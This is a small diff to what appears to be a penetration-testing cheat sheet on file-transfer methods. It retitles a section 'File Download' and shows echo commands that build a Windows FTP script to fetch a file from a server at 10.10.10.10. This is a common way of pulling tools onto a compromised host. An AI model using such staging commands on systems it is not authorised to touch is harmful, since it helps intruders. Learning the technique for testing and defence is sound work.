@@ -181,9 +181,9 @@ USING NC / NETCAT -
 USING FTP - 
 ------------------------------------------------------------------------------------------------------------------
 
-**Start SMB Server**
+**File Download**
     
-    echo open 192.168.1.143 21 > file.txt
+    echo open 10.10.10.10 21 > file.txt
     echo bin>> file.txt
     echo get demo.txt>> file.txt
     echo bye>> file.txt
